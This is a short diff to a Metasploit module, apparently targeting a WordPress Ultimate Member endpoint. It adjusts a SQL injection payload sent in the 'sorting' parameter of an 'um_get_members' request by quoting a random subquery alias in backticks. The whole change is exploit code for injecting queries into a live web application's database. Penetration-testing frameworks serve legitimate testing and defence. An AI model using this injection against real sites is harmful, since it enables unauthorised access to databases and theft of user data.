@@ -141,7 +141,9 @@ class MetasploitModule < Msf::Auxiliary
             'action' => 'um_get_members',
             'nonce' => nonce,
             'directory_id' => directory_id,
-            'sorting' => "user_login AND (SELECT #{random_negative_number} FROM (SELECT(#{payload}))#{random_characters})"
+            # Alphanumeric aliases can resemble numbers, exponents or SQL keywords.
+            # https://mariadb.com/docs/server/reference/sql-structure/sql-language-structure/identifier-names
+            'sorting' => "user_login AND (SELECT #{random_negative_number} FROM (SELECT(#{payload}))`#{random_characters}`)"
           }
         })
         fail_with(Failure::Unreachable, 'Connection failed') unless res
